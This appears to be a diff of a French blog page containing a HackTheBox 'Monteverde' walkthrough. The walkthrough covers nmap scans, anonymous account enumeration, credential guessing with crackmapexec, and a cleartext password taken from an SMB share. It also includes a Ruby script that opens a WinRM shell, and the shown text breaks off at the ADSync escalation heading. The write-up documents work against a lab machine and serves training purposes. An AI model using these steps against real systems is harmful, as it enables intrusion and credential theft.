@@ -11,7 +11,7 @@
 <meta http-equiv="Cache-Control" content="public" />
 <!-- Enable responsiveness on mobile devices -->
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
-<meta name="generator" content="Hugo 0.55.6" />
+<meta name="generator" content="Hugo 0.80.0" />
 
     
     
@@ -28,8 +28,8 @@
 <meta property="og:description" content="Monteverde est une machine Windows considérée comme facile/moyenne et orientée Active Directory. Un pseudo accès anonyme permet d&rsquo;énumérer les comptes du domaine et ainsi identifier un compte trivial. L&rsquo;analyse d&rsquo;un partage réseau permet par la suite de récupérer un compte membre du groupe &ldquo;Azure Admins&rdquo;. L&rsquo;escalade de privilège est réalisée au travers de l&rsquo;exploitation de Azure AD Connect." />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://haax9.github.io/fr/walkthroughs/hackthebox/monteverde/" />
-<meta property="article:published_time" content="2020-06-14T00:00:00&#43;00:00"/>
-<meta property="article:modified_time" content="2020-06-14T00:00:00&#43;00:00"/><meta property="og:site_name" content="Haax - Personal Blog" />
+<meta property="article:published_time" content="2020-06-14T00:00:00+00:00" />
+<meta property="article:modified_time" content="2020-06-14T00:00:00+00:00" /><meta property="og:site_name" content="Haax - Personal Blog" />
 
 
     
@@ -52,6 +52,32 @@
     <!-- Icons -->
     <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/apple-touch-icon-144-precomposed.png">
     <link rel="shortcut icon" href="/favicon.png">
+    
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'G-GB7QC0EDF8', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+    
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'G-GB7QC0EDF8', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
     
 
 </head>
@@ -170,7 +196,7 @@
       <a rel="alternate" href="/en/walkthroughs/hackthebox/monteverde/" hreflang="en" lang="en"><img src="/img/icons/logo_drapeau_angleterre.png" alt="logo_angleterre" class="logoFlag"/></a>
       </div>
     <p class="copyright">
-      &copy; 2022 Haax.
+      &copy; 2023 Haax.
       <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">Some Rights Reserved</a>.
       <br/>Built with
       <a href="https://gohugo.io">Hugo</a> ❤️ <a href="https://github.com/htr3n/hyde-hyde">hyde-hyde</a>.
@@ -204,37 +230,30 @@
   </header>
   <div class="post">
     <p>Monteverde est une machine Windows considérée comme facile/moyenne et orientée Active Directory. Un pseudo accès anonyme permet d&rsquo;énumérer les comptes du domaine et ainsi identifier un compte trivial. L&rsquo;analyse d&rsquo;un partage réseau permet par la suite de récupérer un compte membre du groupe &ldquo;Azure Admins&rdquo;. L&rsquo;escalade de privilège est réalisée au travers de l&rsquo;exploitation de Azure AD Connect.</p>
-
 <p><strong>Disclaimer :</strong> Il s&rsquo;agit d&rsquo;une présentation plutôt rapide qui omet volontairement les différents axes de recherche. Seul les résultats effectifs ainsi qu&rsquo;une rapide démarche sont présentés.</p>
-
-<h2 id="découverte-énumération">Découverte / Énumération</h2>
-
+<h2 id="découverte--énumération">Découverte / Énumération</h2>
 <p>Un rapide scan de ports permet d&rsquo;obtenir les services présents sur la machine.</p>
-
-<pre><code class="language-bash">Nmap scan report for 10.10.10.172
-Host is up, received echo-reply ttl 127 (0.085s latency).
-Scanned at 2020-02-02 16:30:39 CET for 159s
-Not shown: 989 filtered ports
-Reason: 989 no-responses
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.172
+Host is up, received echo-reply ttl <span style="color:#ae81ff">127</span> <span style="color:#f92672">(</span>0.085s latency<span style="color:#f92672">)</span>.
+Scanned at 2020-02-02 16:30:39 CET <span style="color:#66d9ef">for</span> 159s
+Not shown: <span style="color:#ae81ff">989</span> filtered ports
+Reason: <span style="color:#ae81ff">989</span> no-responses
 PORT     STATE SERVICE       REASON          VERSION
-53/tcp   open  domain?       syn-ack ttl 127
-88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2020-02-02 15:41:58Z)
-135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
-139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
-389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
-445/tcp  open  microsoft-ds? syn-ack ttl 127
-464/tcp  open  kpasswd5?     syn-ack ttl 127
-593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
-636/tcp  open  tcpwrapped    syn-ack ttl 127
-3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
-3269/tcp open  tcpwrapped    syn-ack ttl 127
-</code></pre>
-
-<p>Ne pas oublier de scanner un nombre de ports plus important que les ports classiques.. Cela m&rsquo;a valu du temps perdu ! En effet, de cette manière, les ports 5985 et 9389 sont identifiés (et cela est très important pour la suite!)</p>
-
-<pre><code class="language-bash">nmap scan report for 10.10.10.172
-Host is up (0.091s latency).
-Not shown: 9988 filtered ports
+53/tcp   open  domain?       syn-ack ttl <span style="color:#ae81ff">127</span>
+88/tcp   open  kerberos-sec  syn-ack ttl <span style="color:#ae81ff">127</span> Microsoft Windows Kerberos <span style="color:#f92672">(</span>server time: 2020-02-02 15:41:58Z<span style="color:#f92672">)</span>
+135/tcp  open  msrpc         syn-ack ttl <span style="color:#ae81ff">127</span> Microsoft Windows RPC
+139/tcp  open  netbios-ssn   syn-ack ttl <span style="color:#ae81ff">127</span> Microsoft Windows netbios-ssn
+389/tcp  open  ldap          syn-ack ttl <span style="color:#ae81ff">127</span> Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+445/tcp  open  microsoft-ds? syn-ack ttl <span style="color:#ae81ff">127</span>
+464/tcp  open  kpasswd5?     syn-ack ttl <span style="color:#ae81ff">127</span>
+593/tcp  open  ncacn_http    syn-ack ttl <span style="color:#ae81ff">127</span> Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped    syn-ack ttl <span style="color:#ae81ff">127</span>
+3268/tcp open  ldap          syn-ack ttl <span style="color:#ae81ff">127</span> Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+3269/tcp open  tcpwrapped    syn-ack ttl <span style="color:#ae81ff">127</span>
+</code></pre></div><p>Ne pas oublier de scanner un nombre de ports plus important que les ports classiques.. Cela m&rsquo;a valu du temps perdu ! En effet, de cette manière, les ports 5985 et 9389 sont identifiés (et cela est très important pour la suite!)</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.172
+Host is up <span style="color:#f92672">(</span>0.091s latency<span style="color:#f92672">)</span>.
+Not shown: <span style="color:#ae81ff">9988</span> filtered ports
 PORT     STATE SERVICE
 53/tcp   open  domain
 88/tcp   open  kerberos-sec
@@ -249,284 +268,229 @@ PORT     STATE SERVICE
 3269/tcp open  globalcatLDAPssl
 5985/tcp open  wsman
 9389/tcp open  adws
-</code></pre>
-
-<p>Le domaine est ainsi repéré et les différents services semblent indiquer que l&rsquo;on se trouve face à un contrôleur de domaine Active Directory.</p>
-
+</code></pre></div><p>Le domaine est ainsi repéré et les différents services semblent indiquer que l&rsquo;on se trouve face à un contrôleur de domaine Active Directory.</p>
 <p>Il est possible d&rsquo;interroger l&rsquo;AD en tant qu&rsquo;utilisateur anonyme, ce qui permet notamment de récupérer la liste des utilisateurs du domaine (entre autres).</p>
-
-<pre><code class="language-bash">$ rpcclient -U &quot;&quot; 10.10.10.172
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ rpcclient -U <span style="color:#e6db74">&#34;&#34;</span> 10.10.10.172
 Unable to initialize messaging context
 rpcclient $&gt; srvinfo
 Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED
 
 rpcclient $&gt; enumdomusers
-user:[Guest] rid:[0x1f5]
-user:[AAD_987d7f2f57d2] rid:[0x450]
-user:[mhope] rid:[0x641]
-user:[SABatchJobs] rid:[0xa2a]
-user:[svc-ata] rid:[0xa2b]
-user:[svc-bexec] rid:[0xa2c]
-user:[svc-netapp] rid:[0xa2d]
-user:[dgalanos] rid:[0xa35]
-user:[roleary] rid:[0xa36]
-user:[smorgan] rid:[0xa37]
+user:<span style="color:#f92672">[</span>Guest<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x1f5<span style="color:#f92672">]</span>
+user:<span style="color:#f92672">[</span>AAD_987d7f2f57d2<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x450<span style="color:#f92672">]</span>
+user:<span style="color:#f92672">[</span>mhope<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x641<span style="color:#f92672">]</span>
+user:<span style="color:#f92672">[</span>SABatchJobs<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0xa2a<span style="color:#f92672">]</span>
+user:<span style="color:#f92672">[</span>svc-ata<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0xa2b<span style="color:#f92672">]</span>
+user:<span style="color:#f92672">[</span>svc-bexec<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0xa2c<span style="color:#f92672">]</span>
+user:<span style="color:#f92672">[</span>svc-netapp<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0xa2d<span style="color:#f92672">]</span>
+user:<span style="color:#f92672">[</span>dgalanos<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0xa35<span style="color:#f92672">]</span>
+user:<span style="color:#f92672">[</span>roleary<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0xa36<span style="color:#f92672">]</span>
+user:<span style="color:#f92672">[</span>smorgan<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0xa37<span style="color:#f92672">]</span>
 
-</code></pre>
-
-<p><strong>Note importante :</strong> Afin d&rsquo;éviter les problèmes de résolution DNS, ne pas oublier de renseigner les informations de la machine dans les fichiers <code>resolv.conf</code> et <code>hosts</code>.</p>
-
-<pre><code class="language-bash">$ cat /etc/hosts
+</code></pre></div><p><strong>Note importante :</strong> Afin d&rsquo;éviter les problèmes de résolution DNS, ne pas oublier de renseigner les informations de la machine dans les fichiers <code>resolv.conf</code> et <code>hosts</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ cat /etc/hosts
 127.0.0.1 localhost
 127.0.1.1 kalinux
 
 10.10.10.172 megabank.local
-</code></pre>
-
-<pre><code class="language-bash">$ cat /etc/resolv.conf 
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ cat /etc/resolv.conf 
 search megabank.local
 nameserver 10.10.10.172
-</code></pre>
-
-<h2 id="compte-trivial-et-énumération-des-partages">Compte trivial et énumération des partages</h2>
-
+</code></pre></div><h2 id="compte-trivial-et-énumération-des-partages">Compte trivial et énumération des partages</h2>
 <p>Il n&rsquo;est pas rare dans un domaine Active Directory que certains comptes utilisent des mots de passe triviaux, notamment pour les comptes ayant vocation à être utilisé par différents process/personnes.</p>
-
 <p>Après quelques tests on se rend rapidement compte que c&rsquo;est le cas du compte &ldquo;SABatchJobs&rdquo; !</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ crackmapexec smb 10.10.10.172 -u <span style="color:#e6db74">&#34;SABatchJobs&#34;</span> -p <span style="color:#e6db74">&#34;SABatchJobs&#34;</span>          
+SMB         10.10.10.172    <span style="color:#ae81ff">445</span>    MONTEVERDE       <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows 10.0 Build <span style="color:#ae81ff">17763</span> x64 <span style="color:#f92672">(</span>name:MONTEVERDE<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:MEGABANK<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span>
+SMB         10.10.10.172    <span style="color:#ae81ff">445</span>    MONTEVERDE       <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> MEGABANK<span style="color:#ae81ff">\S</span>ABatchJobs:SABatchJobs
+</code></pre></div><p>À partir de là, on peut notamment commencer à fouiller les différents partages réseaux accessibles.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ crackmapexec smb 10.10.10.172 -u <span style="color:#e6db74">&#34;SABatchJobs&#34;</span> -p <span style="color:#e6db74">&#34;SABatchJobs&#34;</span> --shares
+SMB         10.10.10.172    <span style="color:#ae81ff">445</span>    MONTEVERDE       <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows 10.0 Build <span style="color:#ae81ff">17763</span> x64 <span style="color:#f92672">(</span>name:MONTEVERDE<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:MEGABANK<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span>
+SMB         10.10.10.172    <span style="color:#ae81ff">445</span>    MONTEVERDE       <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> MEGABANK<span style="color:#ae81ff">\S</span>ABatchJobs:SABatchJobs 
+SMB         10.10.10.172    <span style="color:#ae81ff">445</span>    MONTEVERDE       <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Enumerated shares
+SMB         10.10.10.172    <span style="color:#ae81ff">445</span>    MONTEVERDE       Share           Permissions     Remark
+SMB         10.10.10.172    <span style="color:#ae81ff">445</span>    MONTEVERDE       -----           -----------     ------
+SMB         10.10.10.172    <span style="color:#ae81ff">445</span>    MONTEVERDE       ADMIN$                          Remote Admin
+SMB         10.10.10.172    <span style="color:#ae81ff">445</span>    MONTEVERDE       azure_uploads   READ            
+SMB         10.10.10.172    <span style="color:#ae81ff">445</span>    MONTEVERDE       C$                              Default share
+SMB         10.10.10.172    <span style="color:#ae81ff">445</span>    MONTEVERDE       E$                              Default share
+SMB         10.10.10.172    <span style="color:#ae81ff">445</span>    MONTEVERDE       IPC$            READ            Remote IPC
+SMB         10.10.10.172    <span style="color:#ae81ff">445</span>    MONTEVERDE       NETLOGON        READ            Logon server share 
+SMB         10.10.10.172    <span style="color:#ae81ff">445</span>    MONTEVERDE       SYSVOL          READ            Logon server share 
+SMB         10.10.10.172    <span style="color:#ae81ff">445</span>    MONTEVERDE       users$          READ      
+</code></pre></div><p>Le partage <code>users$</code> attire notre attention. Différents répertoires utilisateurs y sont présents, vides. À l&rsquo;exception d&rsquo;un, contenant un fichier <code>azure.xml</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ smbclient -U SABatchJobs //10.10.10.172/users$
 
-<pre><code class="language-bash">$ crackmapexec smb 10.10.10.172 -u &quot;SABatchJobs&quot; -p &quot;SABatchJobs&quot;          
-SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10.0 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK) (signing:True) (SMBv1:False)
-SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK\SABatchJobs:SABatchJobs
-</code></pre>
+smb: <span style="color:#ae81ff">\m</span>hope<span style="color:#ae81ff">\&gt;</span> ls
+  .                                   D        <span style="color:#ae81ff">0</span>  Fri Jan  <span style="color:#ae81ff">3</span> 14:41:18 <span style="color:#ae81ff">2020</span>
+  ..                                  D        <span style="color:#ae81ff">0</span>  Fri Jan  <span style="color:#ae81ff">3</span> 14:41:18 <span style="color:#ae81ff">2020</span>
+  azure.xml                          AR     <span style="color:#ae81ff">1212</span>  Fri Jan  <span style="color:#ae81ff">3</span> 14:40:23 <span style="color:#ae81ff">2020</span>
 
-<p>À partir de là, on peut notamment commencer à fouiller les différents partages réseaux accessibles.</p>
-
-<pre><code class="language-bash">$ crackmapexec smb 10.10.10.172 -u &quot;SABatchJobs&quot; -p &quot;SABatchJobs&quot; --shares
-SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10.0 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK) (signing:True) (SMBv1:False)
-SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK\SABatchJobs:SABatchJobs 
-SMB         10.10.10.172    445    MONTEVERDE       [+] Enumerated shares
-SMB         10.10.10.172    445    MONTEVERDE       Share           Permissions     Remark
-SMB         10.10.10.172    445    MONTEVERDE       -----           -----------     ------
-SMB         10.10.10.172    445    MONTEVERDE       ADMIN$                          Remote Admin
-SMB         10.10.10.172    445    MONTEVERDE       azure_uploads   READ            
-SMB         10.10.10.172    445    MONTEVERDE       C$                              Default share
-SMB         10.10.10.172    445    MONTEVERDE       E$                              Default share
-SMB         10.10.10.172    445    MONTEVERDE       IPC$            READ            Remote IPC
-SMB         10.10.10.172    445    MONTEVERDE       NETLOGON        READ            Logon server share 
-SMB         10.10.10.172    445    MONTEVERDE       SYSVOL          READ            Logon server share 
-SMB         10.10.10.172    445    MONTEVERDE       users$          READ      
-</code></pre>
-
-<p>Le partage <code>users$</code> attire notre attention. Différents répertoires utilisateurs y sont présents, vides. À l&rsquo;exception d&rsquo;un, contenant un fichier <code>azure.xml</code>.</p>
-
-<pre><code class="language-bash">$ smbclient -U SABatchJobs //10.10.10.172/users$
-
-smb: \mhope\&gt; ls
-  .                                   D        0  Fri Jan  3 14:41:18 2020
-  ..                                  D        0  Fri Jan  3 14:41:18 2020
-  azure.xml                          AR     1212  Fri Jan  3 14:40:23 2020
-
-    524031 blocks of size 4096. 519955 blocks available
-smb: \mhope\&gt; get azure.xml
-getting file \mhope\azure.xml of size 1212 as azure.xml (4.1 KiloBytes/sec) (average 4.1 KiloBytes/sec)
-</code></pre>
-
-<p>En récupérant le fichier, on se rend compte qu&rsquo;un mot de passe y est stocké en clair. Il s&rsquo;agit entre autres d&rsquo;un fichier de configuration pour Azure.</p>
-
-<pre><code class="language-bash">$ cat azure.xml 
-��&lt;Objs Version=&quot;1.1.0.1&quot; xmlns=&quot;http://schemas.microsoft.com/powershell/2004/04&quot;&gt;
-  &lt;Obj RefId=&quot;0&quot;&gt;
-    &lt;TN RefId=&quot;0&quot;&gt;
+    <span style="color:#ae81ff">524031</span> blocks of size 4096. <span style="color:#ae81ff">519955</span> blocks available
+smb: <span style="color:#ae81ff">\m</span>hope<span style="color:#ae81ff">\&gt;</span> get azure.xml
+getting file <span style="color:#ae81ff">\m</span>hope<span style="color:#ae81ff">\a</span>zure.xml of size <span style="color:#ae81ff">1212</span> as azure.xml <span style="color:#f92672">(</span>4.1 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 4.1 KiloBytes/sec<span style="color:#f92672">)</span>
+</code></pre></div><p>En récupérant le fichier, on se rend compte qu&rsquo;un mot de passe y est stocké en clair. Il s&rsquo;agit entre autres d&rsquo;un fichier de configuration pour Azure.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ cat azure.xml 
+��&lt;Objs Version<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;1.1.0.1&#34;</span> xmlns<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://schemas.microsoft.com/powershell/2004/04&#34;</span>&gt;
+  &lt;Obj RefId<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;0&#34;</span>&gt;
+    &lt;TN RefId<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;0&#34;</span>&gt;
       &lt;T&gt;Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential&lt;/T&gt;
       &lt;T&gt;System.Object&lt;/T&gt;
     &lt;/TN&gt;
     &lt;ToString&gt;Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential&lt;/ToString&gt;
     &lt;Props&gt;
-      &lt;DT N=&quot;StartDate&quot;&gt;2020-01-03T05:35:00.7562298-08:00&lt;/DT&gt;
-      &lt;DT N=&quot;EndDate&quot;&gt;2054-01-03T05:35:00.7562298-08:00&lt;/DT&gt;
-      &lt;G N=&quot;KeyId&quot;&gt;00000000-0000-0000-0000-000000000000&lt;/G&gt;
-      &lt;S N=&quot;Password&quot;&gt;4n0therD4y@n0th3r$&lt;/S&gt;
+      &lt;DT N<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;StartDate&#34;</span>&gt;2020-01-03T05:35:00.7562298-08:00&lt;/DT&gt;
+      &lt;DT N<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;EndDate&#34;</span>&gt;2054-01-03T05:35:00.7562298-08:00&lt;/DT&gt;
+      &lt;G N<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;KeyId&#34;</span>&gt;00000000-0000-0000-0000-000000000000&lt;/G&gt;
+      &lt;S N<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Password&#34;</span>&gt;4n0therD4y@n0th3r$&lt;/S&gt;
     &lt;/Props&gt;
   &lt;/Obj&gt;
 &lt;/Objs&gt;%
-</code></pre>
-
-<p>On vérifie la validité du mot de passe à l&rsquo;aide de CrackMapExec, pour l&rsquo;utilisateur <code>mhope</code>, là où on a trouvé le fichier. Je passe les détails, mais dans la phase d&rsquo;énumération des utilisateurs et groupe, cet utilisateur a été identifié comme appartenant au groupe &ldquo;Azure Admins&rdquo;.</p>
-
-<pre><code class="language-bash">$ crackmapexec smb 10.10.10.172 -u &quot;mhope&quot; -p &quot;4n0therD4y@n0th3r$&quot;    
-SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10.0 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK) (signing:True) (SMBv1:False)
-SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK\mhope:4n0therD4y@n0th3r$
-</code></pre>
-
-<h2 id="accès-via-winrm">Accès via WinRM</h2>
-
+</code></pre></div><p>On vérifie la validité du mot de passe à l&rsquo;aide de CrackMapExec, pour l&rsquo;utilisateur <code>mhope</code>, là où on a trouvé le fichier. Je passe les détails, mais dans la phase d&rsquo;énumération des utilisateurs et groupe, cet utilisateur a été identifié comme appartenant au groupe &ldquo;Azure Admins&rdquo;.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ crackmapexec smb 10.10.10.172 -u <span style="color:#e6db74">&#34;mhope&#34;</span> -p <span style="color:#e6db74">&#34;4n0therD4y@n0th3r</span>$<span style="color:#e6db74">&#34;</span>    
+SMB         10.10.10.172    <span style="color:#ae81ff">445</span>    MONTEVERDE       <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows 10.0 Build <span style="color:#ae81ff">17763</span> x64 <span style="color:#f92672">(</span>name:MONTEVERDE<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:MEGABANK<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span>
+SMB         10.10.10.172    <span style="color:#ae81ff">445</span>    MONTEVERDE       <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> MEGABANK<span style="color:#ae81ff">\m</span>hope:4n0therD4y@n0th3r$
+</code></pre></div><h2 id="accès-via-winrm">Accès via WinRM</h2>
 <p>Cependant, ce compte n&rsquo;est pas administrateur et les possibilités d&rsquo;exécution de commande à distance sont limitées.
 C&rsquo;est là qu&rsquo;intervient WinRM (Windows Remote Management). Il s&rsquo;agit d&rsquo;un service/protocole Microsoft HTTP, basé sur WS-Management (SOAP) qui permet l&rsquo;administration à distance de machines sous Windows.
 De retour à notre scan nmap, le port <strong>5985</strong>, utilisé par défaut par WinRM, est ouvert.</p>
-
 <p>Plusieurs façon d&rsquo;exploiter. J&rsquo;ai choisi d&rsquo;utiliser le script Ruby suivant.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby"><span style="color:#960050;background-color:#1e0010">$</span> cat winrm_shell<span style="color:#f92672">.</span>rb 
+require <span style="color:#e6db74">&#39;winrm&#39;</span>
 
-<pre><code class="language-ruby">$ cat winrm_shell.rb 
-require 'winrm'
-
-conn = WinRM::Connection.new(
-  endpoint: 'http://10.10.10.172:5985/wsman',
-  user: 'MEGABANK\mhope',
-  password: '4n0therD4y@n0th3r$',
+conn <span style="color:#f92672">=</span> <span style="color:#66d9ef">WinRM</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Connection</span><span style="color:#f92672">.</span>new(
+  <span style="color:#e6db74">endpoint</span>: <span style="color:#e6db74">&#39;http://10.10.10.172:5985/wsman&#39;</span>,
+  <span style="color:#e6db74">user</span>: <span style="color:#e6db74">&#39;MEGABANK\mhope&#39;</span>,
+  <span style="color:#e6db74">password</span>: <span style="color:#e6db74">&#39;4n0therD4y@n0th3r$&#39;</span>,
 )
 
-command=&quot;&quot;
+command<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>
 
-conn.shell(:powershell) do |shell|
-    until command == &quot;exit\n&quot; do
-        print &quot;PS &gt; &quot;
-        command = gets
-        output = shell.run(command) do |stdout, stderr|
-            STDOUT.print stdout
-            STDERR.print stderr
-        end
-    end
-    puts &quot;Exiting with code #{output.exitcode}&quot;
-end
-</code></pre>
-
-<p>Ce qui donne un accès à la machine ainsi que le premier flag !</p>
-
-<pre><code class="language-bash">$ ruby winrm_shell.rb 
+conn<span style="color:#f92672">.</span>shell(<span style="color:#e6db74">:powershell</span>) <span style="color:#66d9ef">do</span> <span style="color:#f92672">|</span>shell<span style="color:#f92672">|</span>
+    <span style="color:#66d9ef">until</span> command <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;exit</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span> <span style="color:#66d9ef">do</span>
+        print <span style="color:#e6db74">&#34;PS &gt; &#34;</span>
+        command <span style="color:#f92672">=</span> gets
+        output <span style="color:#f92672">=</span> shell<span style="color:#f92672">.</span>run(command) <span style="color:#66d9ef">do</span> <span style="color:#f92672">|</span>stdout, stderr<span style="color:#f92672">|</span>
+            <span style="color:#66d9ef">STDOUT</span><span style="color:#f92672">.</span>print stdout
+            <span style="color:#66d9ef">STDERR</span><span style="color:#f92672">.</span>print stderr
+        <span style="color:#66d9ef">end</span>
+    <span style="color:#66d9ef">end</span>
+    puts <span style="color:#e6db74">&#34;Exiting with code </span><span style="color:#e6db74">#{</span>output<span style="color:#f92672">.</span>exitcode<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#66d9ef">end</span>
+</code></pre></div><p>Ce qui donne un accès à la machine ainsi que le premier flag !</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ruby winrm_shell.rb 
 PS &gt; whoami
-megabank\mhope
+megabank<span style="color:#ae81ff">\m</span>hope
 PS &gt; pwd
 
 Path                    
 ----                    
-C:\Users\mhope\Documents
+C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\m</span>hope<span style="color:#ae81ff">\D</span>ocuments
 
 
 PS &gt; ls ../Desktop
 
-    Directory: C:\Users\mhope\Desktop
+    Directory: C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\m</span>hope<span style="color:#ae81ff">\D</span>esktop
 
 Mode                LastWriteTime         Length Name                                                                 
 ----                -------------         ------ ----                                                            
--ar---         1/3/2020   5:48 AM             32 user.txt
-</code></pre>
-
-<h2 id="escalade-de-privilege-adsync">Escalade de privilege - ADSync</h2>
-
+-ar---         1/3/2020   5:48 AM             <span style="color:#ae81ff">32</span> user.txt
+</code></pre></div><h2 id="escalade-de-privilege---adsync">Escalade de privilege - ADSync</h2>
 <p>À partir de là, on dispose d&rsquo;un utilisateur membre du groupe &ldquo;Azure Admins&rdquo; et il faut trouver un moyen d&rsquo;escalader ses privilèges. Étant donné la configuration dans laquelle nous sommes, il semble bien que cela tourne autour des mécanismes de Azure.</p>
-
